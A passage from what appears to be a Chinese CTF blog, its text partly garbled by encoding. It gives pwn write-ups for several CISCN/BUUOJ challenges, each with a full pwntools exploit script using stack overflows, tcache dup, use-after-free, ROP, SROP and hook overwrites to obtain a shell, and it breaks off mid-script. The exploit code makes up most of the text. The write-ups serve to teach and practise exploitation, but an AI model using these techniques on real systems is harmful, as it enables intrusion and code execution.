å®ç°å¸¸è§„çš„æ ˆæº¢å‡ºæ“ä½œsystem+binshæ¥getshellï¼š\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_2019_es_2\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28784\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nsystem_plt = elf.plt['system']\n\nru(\"name?\\n\")\npayload1 = \"\"\npayload1 += \"A\"*(0x24)+\"B\"*0x4\np.send(payload1)\nru(\"BBBB\")\nstack_addr = u32(rc(4))\nebp_addr = stack_addr-0x10\nlog.info(\"ebp_addr:0x%x\"%ebp_addr)\n\npayload2 = p32(ebp_addr-0x28+0x8) #0\n#payload2 += p32(ebp_addr-0x40)\npayload2 += p32(system_plt) #4\npayload2 += p32(0x11111111) #padding\npayload2 += p32(ebp_addr-0x28 + 20) #8 binsh_addr\npayload2 += p32(ebp_addr) #12\npayload2 += \"/bin/sh\\x00\" #16\npayload2 = payload2.ljust(0x28,\"A\")\npayload2 += p32(ebp_addr-0x24) #old ebp\npause()\np.send(payload2)\n\n\np.interactive()\n```\n\n3.ciscn_2019_final_3ï¼šfreeä¹‹åæŒ‡é’ˆæœªç½®ç©ºï¼Œä¸”è¯¥2..27ç‰ˆçš„tcacheå­˜åœ¨dupæ¼æ´ã€‚åˆ©ç”¨ç¨‹åºæ³„éœ²å †åœ°å€ï¼Œå†åˆ©ç”¨dupæ§tcacheç»“æ„ä½“ã€‚ä¿®æ”¹ä¸€ä¸ªChunkçš„sizeåŸŸæˆ–è€…ç›´æ¥Freeæ‰ç¨‹åºæœ€å¼€å§‹è‡ªå¸¦çš„ä¸€ä¸ªchunkï¼Œä½¿å…¶è¿›å…¥unsortedbinã€‚ç„¶ååœ¨æ§tcacheï¼Œå†åˆ©ç”¨addå‡½æ•°æ³„éœ²libcåœ°å€ï¼Œæ”¹free_hookä¸ºsystemï¼Œfree(binsh)ä¸€æ­¥getshellã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_final_3\"\nlibc_file= \"./libc.so.6\"\n#libc.so = \"\"\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    #elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"25451\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"choice > \"\n\n\ndef add(idx, size, context):\n    sla(menu, \"1\")\n    sla(\"input the index\\n\", str(idx))\n    sla(\"input the size\\n\", str(size))\n    sa(\"now you can write something\\n\", context)\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"input the index\\n\", str(idx))\n\n# def show(idx):\n# sla(menu, \"3\")\n# sla(\"input index:\", str(idx))\n\n# def edit(idx, num, name, con):\n# sla(menu, \"4\")\n# sla(\"input index:\", str(idx))\n# sla(\"phone number:\", str(num))\n# sa(\"name:\", name)\n# sa(\"des info:\", con)\n\nbarray = 0x11c10\n\nadd(0,0x18,\"A\"*0x18)\n\nru(\"gift :\")\nchunk0_addr = int(rc(14)[2:14],16)-0x10\nheap_base = chunk0_addr - 0x11e60\nbarry_addr = heap_base+0x2d0\nlog.info(\"heap_base:0x%x\"%heap_base)\ndelete(0)\n\nadd(1,0x28,\"A\"*0x8) #1\ndelete(1) #tcache(0x78):1\ndelete(1) #tcache(0x78):1->1\n\nadd(2,0x28,p64(chunk0_addr-0x11c10+0x10)) #tcache(0x78):1->barry\nadd(3,0x28,\"A\") #tcache(0x78):barry\nadd(4,0x28,\"barry\")\ndelete(4)\n\n\nadd(5,0x78,\"B\"*0x8) #5\ndelete(5) #tcache(0x78):5\ndelete(5) #tcache(0x78):5->5\nadd(6,0x78,p64(heap_base+0x10)) #tcache(0x78):5->heap_base+0x10\nadd(7,0x78,\"B\"*0x8) #tcache(0x78):heap_base+0x10\n\nadd(8,0x78,\"\\x07\"+\"\\x00\"+\"\\x02\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x03\"+ \"\\x00\"*0x39+\np64(0x0)+ #0x20\np64(0x0)+ #0x30\np64(barry_addr+0x10)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(0x0)+ #0x70\np64(heap_base+0x10)) #0x80\nadd(9,0x38,\"\\x78\")\npause()\nadd(10,0x38,\"\\xb0\")\nru(\"gift :\")\nlibc_base = int(rc(14)[2:14],16) - 0x3ebc40 - 88 -8\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"free_hook:0x%x\"%free_hook)\n\nadd(11,0x78,\"\\x01\"+\"\\x00\"+\"\\x02\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x03\"+ \"\\x00\"*0x39+\np64(free_hook)+ #0x20\np64(0x0)+ #0x30\np64(barry_addr+0x10)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(0x0)+ #0x70\np64(heap_base+0x10)) #0x80\npause()\nadd(12,0x18,p64(system_addr))\nadd(13,0x58,\"/bin/sh\\x00\")\npause()\ndelete(13)\npause()\np.interactive()\n```\n\n4.ciscn_2019_n_3ï¼šæ²¡å•¥æ¼æ´ï¼Œå°±æ˜¯ç¨‹åºæœ¬èº«é—®é¢˜ï¼Œsträ¸ºç»“æ„ä½“å‹chunkï¼Œintä¸ºæ­£å¸¸chunkï¼Œä¸”chunkä¸­å­˜åœ¨å‡½æ•°æŒ‡é’ˆï¼Œå¯ä»¥é€šè¿‡ä¸€å®šå †å¸ƒå±€ä¿®æ”¹å‡½æ•°æŒ‡é’ˆï¼Œæ”¹æˆsystemå†åŠ bashå³å¯getshellã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_2019_n_3\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"25896\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"CNote > \"\n\n\ndef add(idx, Type, length, value):\nsla(menu, \"1\")\nsla(\"Index > \", str(idx))\nsla(\"Type > \", str(Type))\nif Type == 1:\nsla(\"Value > \", value)\nif Type == 2:\nsla(\"Length > \", str(length))\nsla(\"Value > \", value)\n\ndef delete(idx):\nsla(menu, \"2\")\nsla(\"Index > \", str(idx))\n\ndef show(idx):\nsla(menu, \"3\")\nsla(\"Index > \", str(idx))\n\n# def edit(idx, num, name, con):\n# sla(menu, \"4\")\n# sla(\"input index:\", str(idx))\n# sla(\"phone number:\", str(num))\n# sa(\"name:\", name)\n# sa(\"des info:\", con)\n\n#without stripped\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nmain_addr = elf.sym['main']\n\nadd(0,2,0x88,'A'*10)\nadd(1,2,0x38,'A'*10)\nadd(2,1,24,'1')\ndelete(1)\ndelete(2)\n\nadd(3,2,0xc,'dash'+ p32(system_plt))\nadd(4,2,0x38,'BBBB')\npause()\ndelete(1)\np.interactive()\npause()\n```\n\n5.ciscn_2019_n_5ï¼šæ ˆæº¢å‡ºï¼Œæ³„éœ²åœ°å€ROPã€‚æ²¡å¼€NXï¼Œshellcodeä¹Ÿè¡Œã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_2019_n_5\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n\n'''\n#malloc_hook,main_aren Find\npython2 LibcOffset.py libc-2.23.so\n'''\n\n\n'''\n#without stripped\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"26514\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nmain_addr = elf.sym['main']\n\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n\n#ret = 0x4004c9\n#pop_rdi_ret = 0x400713\n\npayload = \"\"\npayload += \"A\"*0x28\npayload += p64(pop_rdi_ret)\npayload += p64(puts_got)\npayload += p64(puts_plt)\npayload += p64(main_addr)\n\n\nru(\"name\\n\")\npause()\nsl(p64(0x0010000))\nru(\"me?\\n\")\nsl(payload)\nputs_addr = u64(rc(6).ljust(8,'\\x00'))\nlog.info(\"puts_addr:0x%x\"%puts_addr)\n#libcsearcher use\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr-obj.dump('puts')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"binsh_addr:0x%x\"%binsh_addr)\n\npayload = \"\"\npayload += \"A\"*0x28\npayload += p64(ret)\npayload += p64(pop_rdi_ret)\npayload += p64(binsh_addr)\npayload += p64(system_addr)\npayload += p64(main_addr)\n\n\nru(\"name\\n\")\npause()\nsl(p64(0x0010000))\nru(\"me?\\n\")\nsl(payload)\np.interactive()\n```\n\n6.ciscn_s_3ï¼šæ ˆæº¢å‡ºï¼Œåˆ©ç”¨SROPï¼Œæ ˆè¿ç§»ï¼Œå¸¸è§„getshellã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_s_3\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\nelf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28198\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nmain_addr = elf.sym['main']\ngadget_rax_0xf = 0x4004DA\nsyscall_addr = 0x400517\n\npayload1 = \"\"\npayload1 += \"A\"*0x10\npayload1 += p64(main_addr)\np.sendline(payload1)\nstack_addr = u64(rc(0x30)[32:40].ljust(8,'\\x00'))\nlog.info(\"stack_addr:0x%x\"%stack_addr)\n\nbinsh_addr = 0x601030\n\nframe_read = SigreturnFrame() #è®¾ç½®readçš„SROPå¸§\nframe_read.rax = constants.SYS_read\nframe_read.rdi = 0\nframe_read.rsi = binsh_addr\nframe_read.rdx = 0xf\nframe_read.rsp = stack_addr-280 + 0xf8\nframe_read.rip = syscall_addr\n\nlog.info(\"frame_read_addr:0x%x\"%(stack_addr-280))\n\n\nframe_execve = SigreturnFrame()\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = binsh_addr\nframe_execve.rip = syscall_addr\n\npayload2 = \"\"\npayload2 += \"A\"*0x10\npayload2 += p64(gadget_rax_0xf)\npayload2 += p64(syscall_addr)\npayload2 += str(frame_read)\npayload2 += p64(syscall_addr)\npayload2 += str(frame_execve)\npause()\np.sendline(payload2)\npause()\np.sendline(\"/bin/sh\\x00\".ljust(0xf,'A'))\np.interactive()\n```\n\nâ–²éœ€è¦æ³¨æ„çš„æ˜¯ï¼š\n\nsyscallä¸€èˆ¬åé¢éƒ½æœ‰retï¼Œæ‰€ä»¥åœ¨sigreturn_frameä¹‹åå¦‚æœè¿˜éœ€è¦è°ƒç”¨å…¶ä»–çš„sigreturn_frameæˆ–è€…å…¶ä»–å‡½æ•°ï¼Œéƒ½æ˜¯éœ€è¦åœ¨ä¸Šä¸€ä¸ªsigreturn_frameä¸­è®¾ç½®rspï¼Œä½¿å¾—retæ­£å¸¸æ‰§è¡Œã€‚\n\nâ‘ å¦‚æœä¸‹ä¸€æ­¥è¿˜æ˜¯sigreturn_frameï¼Œåˆ™å°†ä¸Šä¸€ä¸ªçš„rspè®¾ç½®ä¸ºæŒ‡å‘syscall_ret_addrçš„æ ˆåœ°å€ã€‚\n\nâ‘¡å¦‚æœä¸‹ä¸€æ­¥æ˜¯å…¶ä»–å‡½æ•°ï¼Œåˆ™éœ€è®¾ç½®å¯¹åº”æŒ‡å‘å‡½æ•°åœ°å€çš„æ ˆåœ°å€ã€‚\n\n(è€Œä»¥ä¸Šçš„è®¾ç½®é€šå¸¸éœ€è¦ç»“åˆæ ˆåŠ«æŒæ¥æ“ä½œï¼Œæ•°æ®å¯æ§æ¯”è¾ƒæ–¹ä¾¿ï¼Œä¸ç”¨è¿˜å¾—ä»åŸå§‹æ ˆä¸Šæ‰¾å¯¹åº”çš„å‡½æ•°åœ°å€æˆ–è€…syscall_ret_addr)\n\n \n\n \n\n \n","tags":["åˆ·é¢˜"],"categories":["PWN"]},{"title":"CISCN2021çº¿ä¸Šå¤ç°","url":"/2021/08/14/CISCN2021çº¿ä¸Šå¤ç°/","content":"\nä¸€.lonelywolfï¼šUAFï¼Œshowå‡½æ•°ä¹Ÿå¯ä»¥æ³„éœ²é‡Šæ”¾åçš„å †å—ã€‚\n\n1.æ€è·¯ï¼š\n\n(1)ç”±äºåœ¨editçš„æ—¶å€™å…ˆæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°å˜é‡ï¼Œç„¶åä¾æ®sizeæ¥ä»å˜é‡ä¸­è·å–æ•°æ®æ‹·è´åˆ°chunkä¸­ï¼Œæ‰€ä»¥æœ€åè¡¥0å…¶å®æ²¡åŠæ³•é€ æˆoff by nullã€‚\n\n(2)ç”³è¯·0x8å¤§å°çš„å †å—ï¼Œé‡Šæ”¾åä¿®æ”¹æ•°æ®ï¼Œè¿ä¸Šæ”¾å…¥tcacheä¹‹åè¢«èµ‹å€¼çš„bkï¼Œshowä¸€ä¸‹ï¼Œæ³„éœ²å‡ºå †åœ°å€ã€‚\n\n(3)ç”³è¯·æœ€å¤§sizeçš„chunkï¼Œ0x78ï¼Œdeleteä¹‹åæ”¹æ‰fdæŒ‡å‘heap_baseï¼Œè·å¾—tcacheç»“æ„ä½“çš„æ§åˆ¶æƒï¼Œ0-0x40ä¸ºå¤§å°ï¼Œ0x40-0x78ä¸ºbiné“¾ï¼Œå¯æ§0x20,0x30,0x40,0x50,0x60,0x70,0x80çš„biné“¾ã€‚\n\n(4)ä¹‹åå°±éšæ„äº†ï¼Œæ§biné“¾å’Œbinå¤§å°ï¼Œå°†ä»»æ„ä¸€ä¸ªbinå¤§å°çš„countæ”¹æˆ7ï¼Œä¼ªé€ æ»¡tcacheï¼Œä¹‹åé‡Šæ”¾ä¸€ä¸ªchunkå³å¯è¿›å…¥unsortedbinä¸­ï¼Œshowä¸€ä¸‹å¾—åˆ°Libcåœ°å€ã€‚\n\n(5)å†æ§tcacheç»“æ„ä½“ï¼Œç›´æ¥å¾—åˆ°malloc_hookçš„chunkï¼Œæ”¹ä¸ºOne_gadgetï¼Œå†ç”³è¯·ä¸€ä¸‹chunkå³å¯getshellã€‚\n\n2.exp\n\n```\n#æ³¨é‡Šå¤´\n\nfrom pwn import *\n#context.log_level = 'debug'\nlocal = 0\nif local:\np = process('./lonelywolf')\nelf = ELF(\"./lonelywolf\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nelse:\np = remote(\"114.116.231.128\",\"25285\")\nlibc = ELF(\"./libc-2.27.so\")\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"Your choice: \"\n\n\ndef add(idx, size):\n    sla(menu, \"1\")\n    sla(\"Index: \",str(idx))\n    sla(\"Size: \",str(size))\n\n\ndef delete(idx):\n    sla(menu, \"4\")\n    sla(\"Index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"2\")\n    sla(\"Index: \", str(idx))\n    sla(\"Content: \", str(con))\n\n#leak heap\nadd(0,8)\nadd(0,8)\ndelete(0)\nedit(0,\"A\"*8)\nshow(0)\nru(\"AAAAAAAA\")\nheap = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x10\n\n#control tcache struct,leak libc\nadd(0,0x78)\ndelete(0)\n#edit(0,p64(heap+0x2a0))\nedit(0,p64(heap+0x10))\nadd(0,0x78)\nadd(0,0x78)\nedit(0,\"\\x00\"*35+\"\\x07\")\ndelete(0)\nshow(0)\nru(\"Content: \")\nmalloc_hook = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-112\nfree_hook = malloc_hook+7352\nlibc = malloc_hook-0x3EBC30\nsystem = libc+0x4F550\nprint(\"free_hook:\",hex(free_hook))\nprint(hex(malloc_hook))\n\n#change malloc_hook to one_gadget\none_gadget = libc+0x10a41c\nedit(0,\"\\x02\"+\"\\x00\"*0x3f+p64(heap+0x280)+\"\\x00\"*0x30)\nadd(0,0x8)\ndelete(0)\nedit(0,p64(malloc_hook))\nadd(0,0x8)\nadd(0,0x8)\nedit(0,p64(one_gadget))\nadd(0,0x8)\np.interactive()\n```\n\n \n\näºŒã€silverwolfï¼š(æ¯”èµ›çš„æ—¶å€™æ²¡æ¥è§¦è¿‡seccompä¿æŠ¤ï¼Œåœ¨å­¦é•¿çš„æŒ‡å¯¼ä¸‹ä¹Ÿç®—æ˜¯åšå‡ºæ¥äº†ã€‚)å’Œä¸Šé¢ä¸€æ ·ï¼Œåªæ˜¯åŠ äº†æ²™ç®±ä¿æŠ¤ï¼Œç”¨seccomp-tools dump ./silverwolfæŸ¥çœ‹ä¸€ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nroot@241adce81c0a:/ctf/CISCN/silverwolf# seccomp-tools dump ./silverwolf\nline CODE JT JF K\n=================================\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x07 0xc000003e if (A != ARCH_X86_64) goto 0009\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x04 0xffffffff if (A != 0xffffffff) goto 0009\n0005: 0x15 0x02 0x00 0x00000000 if (A == read) goto 0008\n0006: 0x15 0x01 0x00 0x00000001 if (A == write) goto 0008\n0007: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0009\n0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0009: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\nå¯ä»¥çœ‹åˆ°åªå‰©readå’Œwriteæƒé™äº†ï¼ŒåŒæ—¶é¢˜ç›®æç¤ºflagåœ¨./flagï¼Œæ‰€ä»¥ç”¨readå’Œwriteæ¥è¯»å–å’Œæ‰“å°flagå³å¯ï¼Œåˆ©ç”¨orwã€‚\n\n1.æ€è·¯ï¼š\n\n(1)ä¸€æ ·çš„ï¼Œæ§tcacheç»“æ„ä½“æ³„éœ²heapå’Œlibcã€‚\n\n(2)è¿™é‡Œç”±äºå¼€seccompä¿æŠ¤ä¼šç”³è¯·æŒºå¤šå †å—çš„ï¼Œæ‰€ä»¥binså’Œheapä¸­éƒ½æ¯”è¾ƒä¹±ï¼Œå†åŠ ä¸Šé™åˆ¶sizeï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥æœ‰ä¸¤ç§æ–¹æ³•ï¼š\n\nâ‘ ä¸€æ˜¯æ§tcacheï¼Œä»0x10-0x80éƒ½ç»™æ§äº†ï¼ŒåŠ èµ·æ¥æ€»å…±0x240ï¼Œè¿™é‡Œç®—å‡ºæ¥æ˜¯0x148ï¼Œè¶³å¤Ÿæ”¾ä¸‹orwäº†ã€‚\n\nâ‘¡äºŒæ˜¯åˆ©ç”¨IO_FILEæ³„éœ²environï¼Œå¾—åˆ°æ ˆåœ°å€ï¼Œå†æ³„éœ²å¾—åˆ°ELFåŸºåœ°å€ï¼Œè®¡ç®—BSSæ®µï¼Œå°†sizeç»™æ”¹äº†ï¼Œé‚£ä¹ˆeditæƒ³è¾“å…¥å¤šå°‘æ•°æ®å°±èƒ½è¾“å…¥å¤šå°‘ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ä¸€ä¸ªchunkä¸­æ”¾ä¸‹æ‰€æœ‰orwã€‚\n\n2.è´´ä¸‹exp:\n\nâ‘ æ§tcacheï¼š\n\n```\nfrom pwn import *\nimport os\nimport struct\nimport random\nimport time\nimport sys\nimport signal\n\n#context.log_level = 'debug'\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nlocal = 1\nif local:\np = process('./silverwolf')\nelf = ELF(\"./silverwolf\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nelse:\np = remote(\"114.116.231.128\",\"25285\")\nlibc = ELF(\"./libc-2.27.so\")\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nret = libc_base + 0x00000000000008aa # ret\npop_rdi_ret = libc_base + 0x00000000000215bf# pop rdi ; ret\npop_rsi_ret = libc_base + 0x0000000000023eea # pop rsi ; ret \npop_rdx_rsi_ret = libc_base + 0x0000000000130569 # pop rdx ; pop rsi ; ret\npop_rdx_ret = libc_base + 0x0000000000001b96 # pop rdx ; ret\nsyscall_ret = libc_base + 0x11B637\npop_rax_ret = libc_base + 0x0000000000043ae8\n\nmenu = \"Your choice: \"\n\n\ndef add(idx, size):\n    sla(menu, \"1\")\n    sla(\"Index: \",str(idx))\n    sla(\"Size: \",str(size))\n\n\ndef delete(idx):\n    sla(menu, \"4\")\n    sla(\"Index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"2\")\n    sla(\"Index: \", str(idx))\n    sla(\"Content: \", str(con))\n\n#leak heap\nadd(0,8)\nadd(0,8)\ndelete(0)\nedit(0,\"A\"*8)\nshow(0)\nru(\"AAAAAAAA\")\nheap = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x10\nprint(\"heap:\",hex(heap))\n\n#control tcache struct,leak libc\nadd(0,0x78)\ndelete(0)\n#edit(0,p64(heap+0x2a0))\nedit(0,p64(heap+0x10))\nadd(0,0x78)\nadd(0,0x78)\nedit(0,\"\\x00\"*35+\"\\x07\")\ndelete(0)\nshow(0)\nru(\"Content: \")\nmalloc_hook = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-112\nfree_hook = malloc_hook+7352\nlibc_base = malloc_hook-0x3EBC30\nsetcontext = libc_base+libc.sym['setcontext']\nsystem = libc_base+0x4F550\nIO_2_1_stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']\nenviron = libc_base+libc.symbols['__environ']\nprint(\"IO_stdout:\",hex(IO_2_1_stdout_addr))\nprint(\"environ:\",hex(environ))\nprint(\"libc:\",hex(libc_base))\nprint(\"setcontext:\",hex(setcontext))\nprint(\"system:\",hex(system))\nprint(\"free_hook:\",hex(free_hook))\nprint(\"malloc_hook:\",hex(malloc_hook))\nprint(\"libsystem:\",hex(libc.sym[\"system\"]))\n\n#use IO_FILE,leak environ,elf_base,bss_addr,change size\nedit(0,\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x02\"+\"\\x04\"+ 